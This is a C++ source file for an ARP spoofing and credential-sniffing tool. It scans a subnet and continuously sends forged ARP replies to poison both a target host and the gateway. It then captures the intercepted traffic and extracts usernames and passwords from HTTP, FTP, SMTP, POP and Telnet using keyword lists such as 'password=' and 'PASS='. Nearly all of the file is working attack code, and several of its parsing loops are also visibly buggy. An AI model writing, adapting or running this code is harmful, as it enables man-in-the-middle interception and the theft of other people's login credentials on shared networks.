#include "arp.h"

ARP::ARP()
{


}

int ARP::socket_init(unsigned char* src_mac,struct sockaddr_ll *src){
    int sock_id;
    sock_id=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sock_id<0){perror("error in create socket\n");exit(-1);}
    //check device
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    memcpy(ifr.ifr_name,device,IFNAMSIZ);
    if (ioctl(sock_id, SIOCGIFINDEX, &ifr) < 0) {//get name of interface
       fprintf(stderr, "arping: unknown iface %s\n", device);
       close(sock_id);
       exit(-1);
    }
    src->sll_ifindex = ifr.ifr_ifindex;
    if (ioctl(sock_id, SIOCGIFHWADDR, &ifr) < 0) {  //get src mac
        perror("ioctl() failed to get source MAC address");
    }
    memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6);
    src->sll_family=AF_PACKET;
    src->sll_protocol = htons(ETH_P_ARP);
    printf("success init socket:%d\n",sock_id);
    return sock_id;

}//return created socket and init src_eth->index,mac
void ARP::create_pkt(unsigned char* buf,struct in_addr src_ip,struct in_addr dst_ip,unsigned char* src_mac,unsigned char* dst_mac,int op){
    //ether
    struct ether_header *eth = (struct ether_header *)buf;
    memcpy(eth->ether_dhost,dst_mac,6);
    memcpy(eth->ether_shost,src_mac,6);
    eth->ether_type=htons(0x0806);//type of frame->arp
    //arp
    struct ether_arp *eah = (struct ether_arp*) (buf+ETHER_HEADER_LEN);
    struct arphdr *ah=&(eah->ea_hdr);
    ah->ar_hrd = htons(ARPHRD_ETHER);//hardware ->Ethernet
    ah->ar_pro = htons(ETH_P_IP);//protocal->IP
    ah->ar_hln = ETH_ALEN;//MAC->6Bytes
    ah->ar_pln = 4;//IP->4Bytes
    if(op==1){ah->ar_op  =  htons(ARPOP_REQUEST);}
    else{ah->ar_op  =  htons(ARPOP_REPLY);}//0x01->request;0x02->reply
    memcpy(eah->arp_sha, src_mac,6);
    memcpy(eah->arp_spa, &src_ip.s_addr,4);
    memset(eah->arp_tha, 0,6);
    memcpy(eah->arp_tpa, &dst_ip.s_addr,4);
}//create arp packet
void ARP::init_hosts(){
    uint32_t gateway_nl;
    uint32_t netmask_nl;
    uint32_t net_nl;
    uint32_t tmp;
    tmp=inet_addr(gateway_str);
    gateway_nl=htonl(tmp);
    printf("gateway_nl=%8x\n",gateway_nl);
    tmp=inet_addr(netmask_str);
    netmask_nl=htonl(tmp);
    printf("netmask_nl=%8x\n",netmask_nl);
    net_nl=gateway_nl&netmask_nl;
    printf("net_nl=%8x\n",net_nl);
    net_size=broad-netmask_nl-1;
    printf("size=%d\n",net_size);
    hosts=(host_info*)malloc(sizeof(host_info)*net_size);
    memset(hosts,0,sizeof (host_info)*net_size);
    struct in_addr addr;
    for(int i=0;i<net_size;i++){
        addr.s_addr=htonl(net_nl+i+1);
        memcpy(hosts[i].ip,inet_ntoa(addr),16);
        // printf("host%d:%s\n",i,hosts[i].ip);
    }
    printf("init_hosts success...\n");
}//init hosts in subnet
void* ARP::arp_sniff(void* argv){
    printf("============you are in pcap_thread============\n");
//    int * flag=(int *)argv;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "arp[7]==2";//arphdr第7个字节op=2,reply
    // bpf_u_int32 bpf_mask;
    pcap_t* handle=pcap_open_live(device,512,1,1000,errbuf);
    if(!handle){
        printf("%s\n", errbuf);
        exit(-1);
    }
    pcap_compile(handle,&fp,filter_exp,0,0);
    if (pcap_setfilter(handle, &fp) !=0) {
        pcap_perror(handle, "Error in setfilter:");
        exit(-1);
    }
    printf("start sniffing...\n");
    int res;//0->timeout
    struct pcap_pkthdr *header;
    const u_char *packet;
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0 && (pcap_flag==1)){
        if(res==0){continue;}
        struct ether_arp *eah = (struct ether_arp*) (packet+ETHER_HEADER_LEN);
        struct arphdr *ah=&(eah->ea_hdr);
        if(ah->ar_op==htons(ARPOP_REPLY)){
            char *ip;
            struct in_addr addr;
            memcpy(&addr.s_addr,eah->arp_spa,4);
            ip=inet_ntoa(addr);
            for(int i=0;i<net_size;i++){
                if(strcmp(ip,hosts[i].ip)==0){
                    hosts[i].up=1;
                    printf("got arp relpy from %s\n",ip);
                }
            }
        }
    }
    pcap_close(handle);
    pthread_exit(0);
}
void ARP::send_subnet(){
    unsigned char send_buf[1024];
    struct in_addr src_ip,dst_ip;
    struct sockaddr_ll src_eth;
    unsigned char src_mac[6],dst_mac[6];
    memset(&src_eth,0,sizeof(src_eth));
    memset(src_mac,0,6);
    memcpy(dst_mac,broad_mac,6);
    src_ip.s_addr=inet_addr(gateway_str);
    int sock_id;
    sock_id=socket_init(src_mac,&src_eth);
    if(pthread_create(&pcap_thread, NULL, arp_sniff, (void *)&pcap_flag)!=0){
        perror("error in pthread_create\n");
        exit(-1);
    }else {
        printf("get pcap_thread to sniff arp reply\n");
    }
    pthread_detach(pcap_thread);
    sleep(2);
    printf("start sendto all hosts...\n");
    for(int i=0;i<net_size;i++){
        if(strcmp(hosts[i].ip,gateway_str)==0){
            // printf("***************arp to real gateway***************\n");
            continue;}
        memset(send_buf,0,1024);
        dst_ip.s_addr=inet_addr(hosts[i].ip);
        create_pkt(send_buf,src_ip,dst_ip,src_mac,dst_mac,1);
        int ret=sendto(sock_id,send_buf,ETHER_ARP_PACKET_LEN,0,(struct sockaddr*)&src_eth,sizeof(src_eth));
        if( ret == ETHER_ARP_PACKET_LEN )
            printf("sendto %s success!\n",hosts[i].ip);
        else{
            printf("index=%d\n",src_eth.sll_ifindex);
            perror("error in sendto\n");}
    }
    printf("sendto success!\n");
    sleep(5);
    pcap_flag=0;//停止pcap_next_ex
    close(sock_id);
}
void ARP::arpscan(){
    init_hosts();
    send_subnet();
}
void* ARP::pkt_sniff(void * argv){
    printf("============you are in pktsn_thread============\n");
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    pcap_t * handle=pcap_open_live(device,512,1,1000,errbuf);
    pcap_compile(handle,&fp,filter_str,0,0);
    if (pcap_setfilter(handle, &fp) !=0) {
        pcap_perror(handle, "Error in setfilter:");
        exit(-1);
    }
    printf("start sniffing with fliter:%s...\n",filter_str);
    pcap_dumper_t* out_pcap;
    out_pcap=pcap_dump_open(handle,"pack.pcap");
    int res;//0->timeout
    struct pcap_pkthdr *header;
    const u_char *packet;
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0 && (pktsn_flag==1)){
        printf("\n=============got packet in pktsniff==================\n");
        pcap_dump((u_char *)out_pcap, header, packet);
//        pkt_analyze(header,packet);
        Widget aw;
        aw.pkt_analyze(header,packet);
    }
    printf("stop packet sniff\n");
    pcap_dump_close(out_pcap);
    pcap_close(handle);
    pthread_exit(0);
}
void* ARP::arpspoof(void* argv){
    char *ip = (char*)argv;
    printf("============you are in spoof_thread to %s============\n",ip);
    struct in_addr src_ip,dst_ip;//保存网络层地址
    struct sockaddr_ll src_eth;//保存物理层地址
    unsigned char src_mac[6],dst_mac[6];
    unsigned char send_buf[1024];
    memset(&src_eth,0,sizeof(src_eth));
    memset(src_mac,0,6);
    memcpy(dst_mac,broad_mac,6);
    if(strcmp(ip,gateway_str)==0){
        printf("spoof to gateway\n");
        src_ip.s_addr=inet_addr(target_str);
        dst_ip.s_addr=inet_addr(gateway_str);
    }else{
        src_ip.s_addr=inet_addr(gateway_str);
        dst_ip.s_addr=inet_addr(target_str);
    }
    int sock_id;
    sock_id=socket_init(src_mac,&src_eth);
    printf("\nARPING %s ", inet_ntoa(dst_ip));
    printf("from %s %s\n\n",  inet_ntoa(src_ip), device);
    int ret;
    create_pkt(send_buf,src_ip,dst_ip,src_mac,dst_mac,2);
    while(spoof_flag==1){
        ret=sendto(sock_id,send_buf,ETHER_ARP_PACKET_LEN,0,(struct sockaddr*)&src_eth,sizeof(src_eth));
        if( ret == ETHER_ARP_PACKET_LEN )
            continue;
        else{
            printf("index=%d\n",src_eth.sll_ifindex);
            perror("error in sendto\n");}
    }
    close(sock_id);
    printf("stop spoof to %s\n",ip);
}
void ARP::startsnsp(){
    if(pthread_create(&spooft_thread, NULL, arpspoof, (void*)target_str)!=0){
        perror("error in pthread_create\n");
        exit(-1);
    }else {
        printf("get spooft_thread to spoof arp reply\n");
    }
    pthread_detach(spooft_thread);
    if(pthread_create(&spoofg_thread, NULL, arpspoof, (void*)gateway_str)!=0){
        perror("error in pthread_create\n");
        exit(-1);
    }else {
        printf("get spoofg_thread to spoof arp reply\n");
    }
//    pthread_detach(spoofg_thread);
//    if(pthread_create(&pktsn_thread, NULL, pkt_sniff,(void*)&pktsn_flag)!=0){
//        perror("error in pthread_create\n");
//        exit(-1);
//    }else {
//        printf("get pktsn_thread to spoof arp reply\n");
//    }
//    pthread_detach(pktsn_thread);
}
int ARP::isHTTP(char *datatcp, int len) {
    int i=0;


    int min=200;
    if(len<200){
        min=len;
    }
    //开始查找
    for(i=0;i<min;i++){
        if(datatcp[i]=='H' && i<min-4){
            if(datatcp[i+1]=='T'&&datatcp[i+2]=='T'&&datatcp[i+3]=='P'&&datatcp[i+4]=='/'){
                return 1;
            }
        }
    }
    return 0;

}

void ARP::printHTTPhead(char *httphead, int len) {
    int flag=0;
        int i;
        for(i=0;i<len;i++){
            if(httphead[i]=='\r' && httphead[i+1]=='\n' && httphead[i+2]=='\r' && httphead[i+3]=='\n'){
                httphead[i]='\0';
                httphead[i+1]='\0';
                break;
            }
            if( flag && httphead[i]=='\r' && httphead[i+1]=='\n'){
                httphead[i]='\0';
                httphead[i+1]='\0';
                break;
            }
        }
        printf("\n**********HTTP  ***********\n");
        if(httphead[0]==0x01&&httphead[1]==0x01&&httphead[2]==0x08&&httphead[3]==0x0a){
            printf("%s", httphead+12);
        }else{
            printf("%s", httphead);
        }
        httphead[i]='\r';
        httphead[i+1]='\n';
}

int ARP::findHTTPPasswd(char *data, int len){
    int i=0, j=0, min=200;
    int p=0;        //在data中的总偏移，用于防止修改非法地址的值
    int flag=0;
    char temp;
    char * next;
    char * start;
    char const* keyword[] = {    //字典，本程序核心技术所在
                                     "username=",         //最常见的
                                     "password=",         //最常见的
                                     "passwd=",             //最常见的

                                     };
    int l=sizeof(keyword) / sizeof(keyword[0]);

    /* 由于TCP首部是变长的，传来的data可能包含有部分TCP首部数据，并不一定是HTTP数据
         故先查找字符串"HTTP/"或"POST"或"GET"，从这个字符串后匹配用户名密码*/
    for(i=0;i<min;i++){
        if(data[i]=='H' && i<min-4){
            if(data[i+1]=='T' && data[i+2]=='T' && data[i+3]=='P' && data[i+4]=='/'){
                start = data+i;
                break;
            }
        }
        if(data[i]=='G' && i<min-3){
            if(data[i+1]=='E' && data[i+2]=='T'){
                start = data+i;
                break;
            }
        }
        if(data[i]=='P' && i<min-4){
            if(data[i+1]=='O' && data[i+2]=='S' && data[i+3]=='T'){
                start = data+i;
                break;
            }
        }
    }

    /* 依次匹配每个关键词 */
    for(i=0;i<l;i++){
        next = start;
        p = 0;
        while( 1 ){   //一个关键词可能出现多次
            next = strstr(next, keyword[i]);
            j=0;
            while(next[j]!='\n' && next[j]!='\r' && next[j]!='&' && next[j]!=';' && next[j]!=' '){
                //若密码中出现了空格和分号，会被自动转码为+和%%3B，而密码中的+会被自动转码为%2B
                if(p>=len){
                    break;
                }
                j++;
                p++;
            }
            temp = next[j];
            next[j] = '\0';

            printf("\n**********HTTP sniffer***********");

            printf("\n%s", next);
            flag=1;
            next[j] = temp;
            next = next + j;
        }
    }
    return flag;
}

int ARP::findFTPPasswd(char *data, int len){
    int i=0, j=0, min=200;
    int p=0;
    char temp;
    char * next;
    char * start;
    int  flag=0;
    char const* keyword[] = {

                                     "USER=",
                                     "PASS=",

                                     };
    int l;
    l=sizeof(keyword) / sizeof(keyword[0]);


    for(i=0;i<min;i++){
        if(data[i]=='U' && i<min-5){
            if(data[i+1]=='S' && data[i+2]=='E' && data[i+3]=='R' && data[i+4]=='='){
                start = data+i;
                break;
            }
        }

        if(data[i]=='P' && i<min-5){
            if(data[i+1]=='A' && data[i+2]=='S' && data[i+3]=='S' && data[i+4]=='='){
                start = data+i;
                break;
            }
        }
    }


    for(i=0;i<l;i++){
        next = start;
        p = 0;
        while( 1 ){
            next = strstr(next, keyword[i]);
            j=0;
            while(next[j]!='\n' && next[j]!='\r'){
                if(p>=len){
                    break;
                }
                j++;
                p++;
            }
            temp = next[j];
            next[j] = '\0';
            if(flag==0){
                printf("\n**********FTP sniffer ***********");
            }
            printf("\n%s", next);
            flag=1;
            next[j] = temp;
            next = next + j;
        }
    }
    return flag;
}

int ARP::findSMTPPasswd(char *data, int len){
    int j;
    int p;
    p=0;
    char * next;
    char * start;
    int flag = 0;
    start = data ;
    next = start;
    printf("\n**********SMTP sniffer ***********\n");
    next = strstr(next, "==" );
    flag=1;
    j=0;
    while(1){
        if(isprint(start[j]&&p<len)){
            printf("%c",start[j]);
            j++;
            p++;
        }else{
             break;
        }
    }
    return flag;
}
int ARP:: findPOPPasswd(char *data, int len, char* info){
    memset(info,0,100);
    int flag=0;
    char * start;
    if(strncmp(data,"user",4)==0){
        printf("get pop user start\n");
        start=data+5;
        flag=1;
    }else if(strncmp(data,"pass",4)==0){
        printf("get pop pass start\n");
        start=data+5;
        flag=2;
    }else{
        printf("nothing\n");
        return 0;
    }

    for(int i=0;i<len;i++){
        if(start[i]=='\r'&&start[i+1]=='\n'){
            sprintf(info+i,"%c",'\0');
            break;
        }
        sprintf(info+i,"%c",start[i]);
        printf("%c",start[i]);
    }
    return flag;
}

int ARP::findTelnetPasswd(char *data, int len){
    int i;
    i=0;
    char * start;
    int  flag=0;
    start = data;
    printf("\n**********Telnet sniffer***********\n");
    for(i=0;i<len;i++){
        if(isprint(*start)){
            printf("%c",*start);
        }
        start++;
    }

    return flag;
}
void ARP:: pkt_analyze(const struct pcap_pkthdr* header,const u_char* pkt_data)
{
    int off,ret;
    time_t timep;
    char * datatcp;
    char szSourceIP[MAX_ADDR_LEN*2], szDestIP[MAX_ADDR_LEN*2];
    struct sockaddr_in saSource, saDest;


    if(header->len<sizeof(ETHHEADER)) return;
    ETHHEADER *eptr=(ETHHEADER*) pkt_data;
    IPHEADER *pIpheader=(IPHEADER*)(pkt_data+sizeof(ETHHEADER));
    TCPHEADER *pTcpheader = (TCPHEADER*)(pkt_data + sizeof(ETHHEADER) + sizeof(IPHEADER));
    if(pIpheader->proto!=6) return;
    off = sizeof(IPHEADER) + sizeof(TCPHEADER) + sizeof(ETHHEADER);
    datatcp = ( char *)pkt_data + off;

    if(isHTTP(datatcp, header->len-off)){
        printf("\n");
        ret=findHTTPPasswd(datatcp, header->len-off);
        printf("\n");
        printHTTPhead(datatcp, header->len-off);
        printf("\n");
    }

    saSource.sin_addr.s_addr = pIpheader->sourceIP;
    strcpy(szSourceIP, inet_ntoa(saSource.sin_addr));
    saDest.sin_addr.s_addr = pIpheader->destIP;
    strcpy(szDestIP, inet_ntoa(saDest.sin_addr));

    time (&timep);
    printf("\n**********information***********");

    printf("\nlen: %d", header->len);
    printf("\ntime: %s", asctime(localtime(&timep)));

    printf("\n**********Enthernet II*********\n");
    int i;
    u_char *ptr;
    ptr = eptr->DestMac;
    i = ETHER_ADDR_LEN;
    printf("Destination MAC addres: ");
    do{
            printf ("%s%02x", (i == ETHER_ADDR_LEN)?"":":", *ptr++);
        }while(--i>0);
    printf ("\n");

    ptr = eptr->SrcMac;
        i = ETHER_ADDR_LEN;
    printf("Sourse MAC address: ");
    do{
            printf ("%s%02x", (i == ETHER_ADDR_LEN)?"":":", *ptr++);
        }while(--i>0);
    printf("\n");

    printf("**********IP***********");
    printf("\nident: %i", ntohs(pIpheader->ident));
    printf("\ntatol: %i", ntohs(pIpheader->tatal_len));
    printf("\nfrag_and_flags: %i", ntohs(pIpheader->frag_and_flags));
    printf("\nttl %d",pIpheader->ttl);
    printf("\ntos: %d",pIpheader->tos);
    printf("\nproto: %d",pIpheader->proto);
    printf("\nchecksum: %i", ntohs(pIpheader->checksum));
    printf("\nSourceIP: %s", szSourceIP);
    printf("\nDestinationIP: %s", szDestIP);

    printf("\n**********TCP***********");
    int sport=(int)ntohs(pTcpheader->sport);
    int dport=(int)ntohs(pTcpheader->dport);
    printf("\nSourceport: %d", sport);
    printf("\nDestinationport: %d", dport);
//    printf("\nseq: %i", ntohs(pTcpheader->seq));
//    printf("\nack: %i", ntohs(pTcpheader->ack));
//    printf("\nsum: %i", ntohs(pTcpheader->sum));

    if(sport==21||dport==21){
        findFTPPasswd(datatcp, header->len-off);
    }

    else if(sport==25||dport==25){
        findSMTPPasswd(datatcp, header->len-off);
    }

    else if(sport==110||dport==110){
//        findPOPPasswd(datatcp, header->len-off);
        findTelnetPasswd(datatcp, header->len-off);
    }

    else if(sport==23||dport==23){
        findTelnetPasswd(datatcp, header->len-off);
    }
}
ARP::~ARP(){
    free(hosts);
}

